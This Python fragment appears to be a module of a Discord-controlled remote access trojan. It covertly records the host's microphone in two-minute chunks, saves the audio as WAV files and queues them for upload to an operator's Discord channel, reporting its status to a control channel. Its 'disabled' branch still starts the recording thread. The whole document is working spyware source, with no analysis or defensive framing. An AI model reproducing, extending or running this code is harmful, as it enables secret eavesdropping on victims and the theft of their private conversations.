from scipy.io.wavfile import write
from threading import Thread
from resources.misc import *
import sounddevice
import os
# end of imports

# anywhere
def start_recording():
    global files_to_send, channel_ids, send_recordings
    while True:
        if send_recordings:
            recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
            sounddevice.wait()
            try: os.mkdir('rec_')
            except: pass
            record_name = 'rec_\\' + current_time() + '.wav'
            write(record_name, 16000, recorded_mic)
            files_to_send.append([channel_ids['recordings'], '', record_name, True])
        else:
            time.sleep(20)

# !recording_startup
recordings_obj = client.get_channel(channel_ids['recordings'])
async for latest_message in recordings_obj.history(limit=2):
    latest_messages_in_recordings.append(latest_message.content)
if 'disable' not in latest_messages_in_recordings:
    Thread(target=start_recording).start()
    await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
    latest_messages_in_recordings = []
else:
    Thread(target=start_recording).start()
    await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete the "disable" message on` <#' + str(channel_ids['recordings']) + '>')
    latest_messages_in_recordings = []
